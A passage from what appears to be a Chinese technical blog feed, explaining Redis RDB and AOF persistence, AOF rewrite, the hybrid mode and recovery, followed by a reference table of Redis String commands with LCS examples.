<p><code>rdbchecksum</code>：从RDB快照功能的version 5 版本开始，一个64位的CRC冗余校验编码会被放置在RDB文件的末尾，以便对整个RDB文件的完整性进行验证。这个功能大概会多损失10%左右的性能，但获得了更高的数据可靠性。所以如果您的Redis服务需要追求极致的性能，就可以将这个选项设置为no。</p>
</li>
</ul>
<h2 id="RDB-更深入理解">RDB 更深入理解</h2>
<blockquote>
<p>由于生产环境中我们为Redis开辟的内存区域都比较大（例如6GB），那么将内存中的数据同步到硬盘的过程可能就会持续比较长的时间，而实际情况是这段时间Redis服务一般都会收到数据写操作请求。那么如何保证数据一致性呢</p>
</blockquote>
<p>​		RDB中的核心思路是Copy-on-Write，来保证在进行快照操作的这段时间，需要压缩写入磁盘上的数据在内存中不会发生变化。在正常的快照操作中，一方面Redis主进程会fork一个新的快照进程专门来做这个事情，这样保证了Redis服务不会停止对客户端包括写请求在内的任何响应。另一方面这段时间发生的数据变化会以副本的方式存放在另一个新的内存区域，待快照操作结束后才会同步到原来的内存区域。</p>
<p>​		举个例子：如果主线程对这些数据也都是读操作（例如图中的键值对 A），那么，主线程和 bgsave 子进程相互不影响。但是，如果主线程要修改一块数据（例如图中的键值对 C），那么，这块数据就会被复制一份，生成该数据的副本。然后，bgsave 子进程会把这个副本数据写入 RDB 文件，而在这个过程中，主线程仍然可以直接修改原来的数据</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-aof-42.jpg" alt="img"></p>
<ul>
<li>
<p><strong>在进行快照操作的这段时间，如果发生服务崩溃怎么办</strong>？</p>
<p>很简单，在没有将数据全部写入到磁盘前，这次快照操作都不算成功。如果出现了服务崩溃的情况，将以上一次完整的RDB快照文件作为恢复内存数据的参考。也就是说，在快照操作过程中不能影响上一次的备份数据。Redis服务会在磁盘上创建一个临时文件进行数据操作，待操作成功后才会用这个临时文件替换掉上一次的备份。</p>
</li>
<li>
<p><strong>可以每秒做一次快照吗</strong>？</p>
<p>对于快照来说，所谓“连拍”就是指连续地做快照。这样一来，快照的间隔时间变得很短，即使某一时刻发生宕机了，因为上一时刻快照刚执行，丢失的数据也不会太多。但是，这其中的快照间隔时间就很关键了。</p>
<p>如下图所示，我们先在 T0 时刻做了一次快照，然后又在 T0+t 时刻做了一次快照，在这期间，数据块 5 和 9 被修改了。如果在 t 这段时间内，机器宕机了，那么，只能按照 T0 时刻的快照进行恢复。此时，数据块 5 和 9 的修改值因为没有快照记录，就无法恢复了。</p>
</li>
</ul>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-rdb-2.jpg" alt="img"></p>
</li>
</ul>
<p>所以，要想尽可能恢复数据，t 值就要尽可能小，t 越小，就越像“连拍”。那么，t 值可以小到什么程度呢，比如说是不是可以每秒做一次快照？毕竟，每次快照都是由 bgsave 子进程在后台执行，也不会阻塞主线程。这种想法其实是错误的。虽然 bgsave 执行时不阻塞主线程，但是，<strong>如果频繁地执行全量快照，也会带来两方面的开销</strong>：</p>
<ul>
<li>一方面，频繁将全量数据写入磁盘，会给磁盘带来很大压力，多个快照竞争有限的磁盘带宽，前一个快照还没有做完，后一个又开始做了，容易造成恶性循环。</li>
<li>另一方面，bgsave 子进程需要通过 fork 操作从主线程创建出来。虽然，子进程在创建后不会再阻塞主线程，但是，fork 这个创建过程本身会阻塞主线程，而且主线程的内存越大，阻塞时间越长。如果频繁 fork 出 bgsave 子进程，这就会频繁<strong>阻塞主线程</strong>了。</li>
</ul>
<p>那么，有什么其他好方法吗？此时，我们可以做增量快照，就是指做了一次全量快照后，后续的快照只对修改的数据进行快照记录，这样可以避免每次全量快照的开销。这个比较好理解。</p>
<p>但是它需要我们使用额外的元数据信息去记录哪些数据被修改了，这会带来额外的<strong>空间开销问题</strong>。那么，还有什么方法既能利用 RDB 的快速恢复，又能以较小的开销做到尽量少丢数据呢？且看后文中4.0版本中引入的RDB和AOF的混合方式。</p>
<h2 id="RDB优缺点">RDB优缺点</h2>
<ul>
<li><strong>优点</strong>
<ul>
<li>RDB文件是某个时间节点的快照，默认使用LZF算法进行压缩，压缩后的文件体积远远小于内存大小，适用于备份、全量复制等场景；</li>
<li>Redis加载RDB文件恢复数据要远远快于AOF方式；</li>
</ul>
</li>
<li><strong>缺点</strong>
<ul>
<li>RDB方式实时性不够，无法做到秒级的持久化；</li>
<li>每次调用bgsave都需要fork子进程，fork子进程属于重量级操作，频繁执行成本较高；</li>
<li>RDB文件是二进制的，没有可读性，AOF文件在了解其结构的情况下可以手动修改或者补全；</li>
<li>版本兼容RDB文件问题；</li>
</ul>
</li>
</ul>
<p>针对RDB不适合实时持久化的问题，Redis提供了AOF持久化方式来解决</p>
<h1>AOF</h1>
<blockquote>
<p>Redis是“写后”日志，Redis先执行命令，把数据写入内存，然后才记录日志。</p>
<p>日志里记录的是Redis收到的每一条命令，这些命令是以文本形式保存。PS: 大多数的数据库采用的是写前日志（WAL），例如MySQL，通过写前日志和两阶段提交，实现数据和逻辑的一致性。</p>
</blockquote>
<p>而AOF日志采用写后日志，即<strong>先写内存，后写日志</strong>。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-aof-41.jpg" alt="img"></p>
<p><strong>为什么采用写后日志</strong>？</p>
<p>Redis要求高性能，采用写日志有两方面好处：</p>
<ul>
<li><strong>避免额外的检查开销</strong>：Redis 在向 AOF 里面记录日志的时候，并不会先去对这些命令进行语法检查。所以，如果先记日志再执行命令的话，日志中就有可能记录了错误的命令，Redis 在使用日志恢复数据时，就可能会出错。</li>
<li>不会阻塞当前的写操作，</li>
</ul>
<p>但这种方式存在潜在风险：</p>
<ul>
<li>如果命令执行完成，写日志之前宕机了，会丢失数据。</li>
<li>主线程写磁盘压力大，导致写盘慢，阻塞后续操作。</li>
</ul>
<h2 id="如何实现AOF">如何实现AOF</h2>
<p>AOF日志记录Redis的每个写命令，步骤分为：命令追加（append）、文件写入（write）和 文件同步（sync）。</p>
<ul>
<li>
<p><strong>命令追加</strong> 当AOF持久化功能打开了，服务器在执行完一个写命令之后，会以协议格式将被执行的写命令追加到服务器的<code>aof_buf</code>缓冲区。</p>
</li>
<li>
<p><strong>文件写入和同步</strong> 关于何时将 <code>aof_buf </code>缓冲区的内容写入AOF文件中，Redis提供了三种写回策略</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-aof-4.jpg" alt="img"><code>Always</code>，同步写回：每个写命令执行完，立马同步地将日志写回磁盘；</p>
<p><code>Everysec</code>，每秒写回：每个写命令执行完，只是先把日志写到AOF文件的内存缓冲区，每隔一秒把缓冲区中的内容写入磁盘；</p>
<p><code>No</code>，操作系统控制的写回：每个写命令执行完，只是先把日志写到AOF文件的内存缓冲区，由操作系统决定何时将缓冲区内容写回磁盘。</p>
</li>
<li>
<p><strong>三种写回策略的优缺点</strong></p>
<p>上面的三种写回策略体现了一个重要原则：<strong>trade-off</strong>，取舍，指在性能和可靠性保证之间做取舍。</p>
<p>关于AOF的同步策略是涉及到操作系统的 write 函数和 fsync 函数的，在《Redis设计与实现》中是这样说明的：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">为了提高文件写入效率，在现代操作系统中，当用户调用write函数，将一些数据写入文件时，操作系统通常会将数据暂存到一个内存缓冲区里，当缓冲区的空间被填满或超过了指定时限后，才真正将缓冲区的数据写入到磁盘里。

这样的操作虽然提高了效率，但也为数据写入带来了安全问题：如果计算机停机，内存缓冲区中的数据会丢失。为此，系统提供了fsync、fdatasync同步函数，可以强制操作系统立刻将缓冲区中的数据写入到硬盘里，从而确保写入数据的安全性。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h2 id="redis-conf中配置AOF">redis.conf中配置AOF</h2>
<p>默认情况下，Redis是没有开启AOF的，可以通过配置redis.conf文件来开启AOF持久化，关于AOF的配置如下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># appendonly参数开启AOF持久化</span>
appendonly no

<span class="token comment"># AOF持久化的文件名，默认是appendonly.aof</span>
appendfilename <span class="token string">"appendonly.aof"</span>

<span class="token comment"># AOF文件的保存位置和RDB文件的位置相同，都是通过dir参数设置的</span>
<span class="token function">dir</span> ./

<span class="token comment"># 同步策略</span>
<span class="token comment"># appendfsync always</span>
appendfsync everysec
<span class="token comment"># appendfsync no</span>

<span class="token comment"># aof重写期间是否同步</span>
no-appendfsync-on-rewrite no

<span class="token comment"># 重写触发配置</span>
auto-aof-rewrite-percentage <span class="token number">100</span>
auto-aof-rewrite-min-size 64mb

<span class="token comment"># 加载aof出错如何处理</span>
aof-load-truncated <span class="token function">yes</span>

<span class="token comment"># 文件重写策略</span>
aof-rewrite-incremental-fsync <span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>
<p><code>appendonly</code>：默认情况下AOF功能是关闭的，将该选项改为yes以便打开Redis的AOF功能。</p>
</li>
<li>
<p><code>appendfilename</code>：这个参数项很好理解了，就是AOF文件的名字。</p>
</li>
<li>
<p><code>appendfsync</code>：这个参数项是AOF功能最重要的设置项之一，主要用于设置“真正执行”操作命令向AOF文件中同步的策略</p>
<p>什么叫“真正执行”呢？还记得Linux操作系统对磁盘设备的操作方式吗？ 为了保证操作系统中I/O队列的操作效率，应用程序提交的I/O操作请求一般是被放置在linux Page Cache中的，然后再由Linux操作系统中的策略自行决定正在写到磁盘上的时机。而Redis中有一个fsync()函数，可以将Page Cache中待写的数据真正写入到物理设备上，而缺点是频繁调用这个fsync()函数干预操作系统的既定策略，可能导致I/O卡顿的现象频繁 。</p>
<p>与上节对应，appendfsync参数项可以设置三个值，分别是：always、everysec、no，默认的值为everysec。</p>
</li>
<li>
<p><code>no-appendfsync-on-rewrite</code>：always和everysec的设置会使真正的I/O操作高频度的出现，甚至会出现长时间的卡顿情况，这个问题出现在操作系统层面上，所有靠工作在操作系统之上的Redis是没法解决的。为了尽量缓解这个情况，Redis提供了这个设置项，保证在完成fsync函数调用时，不会将这段时间内发生的命令操作放入操作系统的Page Cache（这段时间Redis还在接受客户端的各种写操作命令）。</p>
</li>
<li>
<p><code>auto-aof-rewrite-percentage</code>：上文说到在生产环境下，技术人员不可能随时随地使用“BGREWRITEAOF”命令去重写AOF文件。所以更多时候我们需要依靠Redis中对AOF文件的自动重写策略。Redis中对触发自动重写AOF文件的操作提供了两个设置：auto-aof-rewrite-percentage表示如果当前AOF文件的大小超过了上次重写后AOF文件的百分之多少后，就再次开始重写AOF文件。例如该参数值的默认设置值为100，意思就是如果AOF文件的大小超过上次AOF文件重写后的1倍，就启动重写操作。</p>
</li>
<li>
<p><code>auto-aof-rewrite-min-size</code>：参考auto-aof-rewrite-percentage选项的介绍，auto-aof-rewrite-min-size设置项表示启动AOF文件重写操作的AOF文件最小大小。如果AOF文件大小低于这个值，则不会触发重写操作。注意，auto-aof-rewrite-percentage和auto-aof-rewrite-min-size只是用来控制Redis中自动对AOF文件进行重写的情况，如果是技术人员手动调用“BGREWRITEAOF”命令，则不受这两个限制条件左右。</p>
</li>
</ul>
<h2 id="深入理解AOF重写">深入理解AOF重写</h2>
<blockquote>
<p>AOF会记录每个写命令到AOF文件，随着时间越来越长，AOF文件会变得越来越大。如果不加以控制，会对Redis服务器，甚至对操作系统造成影响，而且AOF文件越大，数据恢复也越慢。为了解决AOF文件体积膨胀的问题，Redis提供AOF文件重写机制来对AOF文件进行“瘦身”。</p>
</blockquote>
<ul>
<li><strong>图例解释AOF重写</strong></li>
</ul>
<p>Redis通过创建一个新的AOF文件来替换现有的AOF，新旧两个AOF文件保存的数据相同，但新AOF文件没有了冗余命令。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-aof-1-1676431861899-14.jpg" alt="img"></p>
<ul>
<li>
<p><strong>AOF重写会阻塞吗</strong>？</p>
<p>AOF重写过程是由后台进程bgrewriteaof来完成的。主线程fork出后台的bgrewriteaof子进程，fork会把主线程的内存拷贝一份给bgrewriteaof子进程，这里面就包含了数据库的最新数据。然后，bgrewriteaof子进程就可以在不影响主线程的情况下，逐一把拷贝的数据写成操作，记入重写日志。</p>
<p>所以aof在重写时，在fork进程时是会阻塞住主线程的。</p>
</li>
<li>
<p><strong>AOF日志何时会重写</strong>？</p>
<p>有两个配置项控制AOF重写的触发：</p>
<p><code>auto-aof-rewrite-min-size</code>:表示运行AOF重写时文件的最小大小，默认为64MB。</p>
<p><code>auto-aof-rewrite-percentage</code>: 这个值的计算方式是，当前aof文件大小和上一次重写后aof文件大小的差值，再除以上一次重写后aof文件大小。也就是当前aof文件比上一次重写后aof文件的增量大小，和上一次重写后aof文件大小的比值。</p>
</li>
<li>
<p><strong>重写日志时，有新数据写入咋整</strong>？</p>
<p>重写过程总结为：“一个拷贝，两处日志”。在fork出子进程时的拷贝，以及在重写时，如果有新数据写入，主线程就会将命令记录到两个aof日志内存缓冲区中。如果AOF写回策略配置的是always，则直接将命令写回旧的日志文件，并且保存一份命令至<code>AOF重写缓冲区</code>，这些操作对新的日志文件是不存在影响的。（旧的日志文件：主线程使用的日志文件，新的日志文件：<code>bgrewriteaof</code>进程使用的日志文件）</p>
<p>而在<code>bgrewriteaof</code>子进程完成会日志文件的重写操作后，会提示主线程已经完成重写操作，主线程会将AOF重写缓冲中的命令追加到新的日志文件后面。这时候在高并发的情况下，AOF重写缓冲区积累可能会很大，这样就会造成阻塞，Redis后来通过Linux管道技术让aof重写期间就能同时进行回放，这样aof重写结束后只需回放少量剩余的数据即可。</p>
<p>最后通过修改文件名的方式，保证文件切换的原子性。</p>
<p>在AOF重写日志期间发生宕机的话，因为日志文件还没切换，所以恢复数据时，用的还是旧的日志文件。</p>
</li>
</ul>
<p><strong>总结操作</strong>：</p>
<ul>
<li>主线程fork出子进程重写aof日志</li>
<li>子进程重写日志完成后，主线程追加aof日志缓冲</li>
<li>替换日志文件</li>
</ul>
<blockquote>
<p>这里的进程和线程的概念有点混乱。因为后台的bgreweiteaof进程就只有一个线程在操作，而主线程是Redis的操作进程，也是单独一个线程。这里想表达的是Redis主进程在fork出一个后台进程之后，后台进程的操作和主进程是没有任何关联的，也不会阻塞主线程。</p>
</blockquote>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-aof-2-1676432308833-17.jpg" alt="img"></p>
<ul>
<li>
<p><strong>主线程fork出子进程的是如何复制内存数据的</strong>？</p>
<p>fork采用操作系统提供的写时复制（copy on write）机制，就是为了避免一次性拷贝大量内存数据给子进程造成阻塞。fork子进程时，子进程时会拷贝父进程的页表，即虚实映射关系（虚拟内存和物理内存的映射索引表），而不会拷贝物理内存。这个拷贝会消耗大量cpu资源，并且拷贝完成前会阻塞主线程，阻塞时间取决于内存中的数据量，数据量越大，则内存页表越大。拷贝完成后，父子进程使用相同的内存地址空间。</p>
<p>但主进程是可以有数据写入的，这时候就会拷贝物理内存中的数据。如下图（进程1看做是主进程，进程2看做是子进程）：</p>
<p>​	<img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-aof-3-1676432355144-20.png" alt="img"></p>
<p>在主进程有数据写入时，而这个数据刚好在页c中，操作系统会创建这个页面的副本（页c的副本)，即拷贝当前页的物理数据，将其映射到主进程中，而子进程还是使用原来的的页c。</p>
</li>
<li>
<p><strong>在重写日志整个过程时，主线程有哪些地方会被阻塞</strong>？</p>
<ol>
<li>fork子进程时，需要拷贝虚拟页表，会对主线程阻塞。</li>
<li>主进程有bigkey写入时，操作系统会创建页面的副本，并拷贝原有的数据，会对主线程阻塞。</li>
<li>子进程重写日志完成后，主进程追加aof重写缓冲区时可能会对主线程阻塞。</li>
</ol>
</li>
<li>
<p><strong>为什么AOF重写不复用原AOF日志</strong>？</p>
<p>两方面原因：</p>
<ol>
<li>父子进程写同一个文件会产生竞争问题，影响父进程的性能。</li>
<li>如果AOF重写过程中失败了，相当于污染了原本的AOF文件，无法做恢复数据使用</li>
</ol>
</li>
</ul>
<h1>RDB和AOF混合方式（4.0版本)</h1>
<blockquote>
<p>Redis 4.0 中提出了一个<strong>混合使用 AOF 日志和内存快照</strong>的方法。简单来说，内存快照以一定的频率执行，在两次快照之间，使用 AOF 日志记录这期间的所有命令操作。</p>
</blockquote>
<p>这样一来，快照不用很频繁地执行，这就避免了频繁 fork 对主线程的影响。而且，AOF 日志也只用记录两次快照间的操作，也就是说，不需要记录所有操作了，因此，就不会出现文件过大的情况了，也可以避免重写开销。</p>
<p>如下图所示，T1 和 T2 时刻的修改，用 AOF 日志记录，等到第二次做全量快照时，就可以清空 AOF 日志，因为此时的修改都已经记录到快照中了，恢复时就不再用日志了。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-rdb-4.jpg" alt="img"></p>
<p>这个方法既能享受到 RDB 文件快速恢复的好处，又能享受到 AOF 只记录操作命令的简单优势, 实际环境中用的很多</p>
<h2 id="从持久化中恢复数据">从持久化中恢复数据</h2>
<blockquote>
<p>数据的备份、持久化做完了，我们如何从这些持久化文件中恢复数据呢？如果一台服务器上有既有RDB文件，又有AOF文件，该加载谁呢？</p>
</blockquote>
<p>其实想要从这些文件中恢复数据，只需要重新启动Redis即可。我们还是通过图来了解这个流程：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-aof-5-1676432697747-25.png" alt="img"></p>
<ul>
<li>redis重启时判断是否开启aof，如果开启了aof，那么就优先加载aof文件；</li>
<li>如果aof存在，那么就去加载aof文件，加载成功的话redis重启成功，如果aof文件加载失败，那么会打印日志表示启动失败，此时可以去修复aof文件后重新启动；</li>
<li>若aof文件不存在，那么redis就会转而去加载rdb文件，如果rdb文件不存在，redis直接启动成功；</li>
<li>如果rdb文件存在就会去加载rdb文件恢复数据，如加载失败则打印日志提示启动失败，如加载成功，那么redis重启成功，且使用rdb文件恢复数据；</li>
</ul>
<p>那么为什么会优先加载AOF呢？因为AOF保存的数据更完整，通过上面的分析我们知道AOF基本上最多损失1s的数据。</p>
<h2 id="性能与实践">性能与实践</h2>
<p>通过上面的分析，我们都知道RDB的快照、AOF的重写都需要fork，这是一个重量级操作，会对Redis造成阻塞。因此为了不影响Redis主进程响应，我们需要尽可能降低阻塞。</p>
<ul>
<li>降低fork的频率，比如可以手动来触发RDB生成快照、与AOF重写；</li>
<li>控制Redis最大使用内存，防止fork耗时过长；</li>
<li>使用更牛逼的硬件；</li>
<li>合理配置Linux的内存分配策略，避免因为物理内存不足导致fork失败。</li>
</ul>
<p>在线上我们到底该怎么做？我提供一些自己的实践经验。</p>
<ul>
<li>如果Redis中的数据并不是特别敏感或者可以通过其它方式重写生成数据，可以关闭持久化，如果丢失数据可以通过其它途径补回；</li>
<li>自己制定策略定期检查Redis的情况，然后可以手动触发备份、重写数据；</li>
<li>单机如果部署多个实例，要防止多个机器同时运行持久化、重写操作，防止出现内存、CPU、IO资源竞争，让持久化变为串行；</li>
<li>可以加入主从机器，利用一台从机器进行备份处理，其它机器正常响应客户端的命令；</li>
<li>RDB持久化与AOF持久化可以同时存在，配合使用。</li>
</ul>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-数据类型（基础）</title>
    <url>/20230103/72ab10c8.html</url>
    <content><![CDATA[<h1>String</h1>
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">使用</th>
<th style="text-align:left">功能</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">SET</td>
<td style="text-align:left">SET <em>key</em> value <br>SET <em>key</em> value ex seconds</td>
<td style="text-align:left">增</td>
<td>储值<br>储值且key在指定秒后过期</td>
</tr>
<tr>
<td style="text-align:left">MSET</td>
<td style="text-align:left">MSET <em>key</em> value [key value …]</td>
<td style="text-align:left">增</td>
<td>同时储多个值</td>
</tr>
<tr>
<td style="text-align:left">SETEX</td>
<td style="text-align:left">SETEX <em>key</em> seconds value</td>
<td style="text-align:left">增</td>
<td>储值，且key在指定秒后过期</td>
</tr>
<tr>
<td style="text-align:left">PSETEX</td>
<td style="text-align:left">PSETEX <em>key</em> milliseconds value</td>
<td style="text-align:left">增</td>
<td>储值，且key在指定毫秒后过期</td>
</tr>
<tr>
<td style="text-align:left">SETNX</td>
<td style="text-align:left">SETNX <em>key</em> value</td>
<td style="text-align:left">增</td>
<td>仅在key不存在时执行</td>
</tr>
<tr>
<td style="text-align:left">MSETNX</td>
<td style="text-align:left">MSETNX <em>key</em> value [key value …]</td>
<td style="text-align:left">增</td>
<td>在所有的key不存在时执行</td>
</tr>
<tr>
<td style="text-align:left">SETRANGE</td>
<td style="text-align:left">SETRANGE <em>key</em> offset value</td>
<td style="text-align:left">改</td>
<td>字符串从offset开始由value替代</td>
</tr>
<tr>
<td style="text-align:left">INCR</td>
<td style="text-align:left">INCR key</td>
<td style="text-align:left">改</td>
<td>key自增</td>
</tr>
<tr>
<td style="text-align:left">DECR</td>
<td style="text-align:left">DECR key</td>
<td style="text-align:left">改</td>
<td>key自减</td>
</tr>
<tr>
<td style="text-align:left">INCRBY</td>
<td style="text-align:left">INCRBY <em>key</em> increment</td>
<td style="text-align:left">改</td>
<td>key增加指定整形量</td>
</tr>
<tr>
<td style="text-align:left">DECRBY</td>
<td style="text-align:left">DECRBY <em>key</em> decrement</td>
<td style="text-align:left">改</td>
<td>key减少指定整形量</td>
</tr>
<tr>
<td style="text-align:left">INCRBYFLOAT</td>
<td style="text-align:left">INCRBYFLOAT <em>key</em> increment</td>
<td style="text-align:left">改</td>
<td>key增加指定浮点量，浮点数为负数则为减少</td>
</tr>
<tr>
<td style="text-align:left">APPEND</td>
<td style="text-align:left">APPEND <em>key</em> value</td>
<td style="text-align:left">改</td>
<td>追加储值</td>
</tr>
<tr>
<td style="text-align:left">GET</td>
<td style="text-align:left">GET <em>key</em></td>
<td style="text-align:left">查</td>
<td>获取key的value</td>
</tr>
<tr>
<td style="text-align:left">MGET</td>
<td style="text-align:left">MGET key [key …]</td>
<td style="text-align:left">查</td>
<td>同时获取多个key</td>
</tr>
<tr>
<td style="text-align:left">GETDEL</td>
<td style="text-align:left">GETDEL <em>key</em></td>
<td style="text-align:left">查&amp;删</td>
<td>获取key的value后删除key</td>
</tr>
<tr>
<td style="text-align:left">GETSET</td>
<td style="text-align:left">GETSET <em>key</em> value</td>
<td style="text-align:left">查&amp;改</td>
<td>set新的value，并返回旧的value</td>
</tr>
<tr>
<td style="text-align:left">GETRANGE</td>
<td style="text-align:left">GETRANGE <em>key</em> start end</td>
<td style="text-align:left">查</td>
<td>获取value的子字符串 （从start到end）</td>
</tr>
<tr>
<td style="text-align:left">SUBSTR</td>
<td style="text-align:left">SUBSTR <em>key</em> start end</td>
<td style="text-align:left">查</td>
<td>获取value的子字符串 （从start到end）</td>
</tr>
<tr>
<td style="text-align:left">STRLEN</td>
<td style="text-align:left">STRLEN key</td>
<td style="text-align:left">查</td>
<td>获取字符串长度</td>
</tr>
</tbody>
</table>
<blockquote>
<p>其他（6.0.6以下版本不支持）</p>
</blockquote>
<table>
<thead>
<tr>
<th></th>
<th>发行版本</th>
<th>命令</th>
<th>功能</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>GETEX</td>
<td>6.2.0</td>
<td><strong>GETEX</strong> key [<strong>EX</strong> seconds |<strong>PX</strong> milliseconds |<strong>EXAT</strong> unix-time-seconds |<strong>PXAT</strong> unix-time-milliseconds |<strong>PERSIST</strong>]</td>
<td>查&amp;删</td>
<td>- <strong>EX</strong> seconds：指定过期秒数<br>- <strong>PX</strong> milliseconds：指定过期毫秒数<br>- <strong>EXAT</strong> timestamp-seconds：指定unix某时间点后多少秒过期<br>- <strong>PXAT</strong> timestamp-milliseconds：指定unix某时间点后多少毫秒过期<br>- <strong>PERSIST</strong>：删除过期时间</td>
</tr>
<tr>
<td>LCS</td>
<td>7.0.0</td>
<td><strong>LCS</strong> key1 key2 [LEN] [<strong>IDX</strong>] [<strong>MINMATCHLEN</strong> len] [<strong>WITHMATCHLEN</strong>]</td>
<td>查</td>
<td>实现最长公共子序列算法。匹配是从最后一个key到第一个key产生的。<br><br>[<strong>LEN</strong>]：最长匹配字符串长度<br>[<strong>IDX</strong>]：返回一个数组。其中包含 LCS匹配结果长度、两个字符串匹配上的开始和结束偏移量<br>[<strong>MINMATCHLEN</strong> len] ：最短匹配字符串长度<br>[<strong>WITHMATCHLEN</strong>]：与IDX一起使用，返回最长公共子字符串的长度</td>
</tr>
</tbody>
</table>
<blockquote>
<p>详解</p>
</blockquote>
<ol>
<li>
<p><span id="Order_LCS"><strong>LCS</strong> key1 key2 [LEN] [<strong>IDX</strong>] [<strong>MINMATCHLEN</strong> len] [<strong>WITHMATCHLEN</strong>] （longest contain substring）</span></p>
<p>LCS 命令实现最长公共子序列算法。请注意，这与最长的常见字符串算法不同，因为字符串中的匹配字符不需要是连续的</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> MSET key1 ohmytext key2 mynewtext
OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>a. 获取匹配结果</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> LCS key1 key2
<span class="token string">"mytext"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>b. 有时我们只需要匹配的长度：LEN</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> LCS key1 key2 LEN
<span class="token string">"6"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>c. 获取匹配的详细情况：IDX（LEN 和 IDX 不可同时存在）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> LCS key1 key2 IDX
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"matches"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">4</span>
         <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">7</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">5</span>
         <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">8</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">2</span>
         <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">3</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">0</span>
         <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">1</span>
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"len"</span>
<span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然而，通常非常有用的是知道每个字符串中的匹配位置：<strong>匹配是从最后一个到第一个产生的</strong></p>
<p>上面的数组意味着第一个匹配项（数组的第二个元素）在第一个字符串的位置 2-3 和第二个字符串的 0-1 之间。然后是 4-7 和 5-8 之间。</p>
<p>要将匹配列表限制为给定最小长度的匹配列表：<code>MINMATCHLEN 4</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> LCS key1 key2 IDX MINMATCHLEN <span class="token number">4</span>
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"matches"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">4</span>
         <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">7</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">5</span>
         <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">8</span>
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"len"</span>
<span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>匹配列表展示匹配长度：<code>WITHMATCHLEN</code></p>
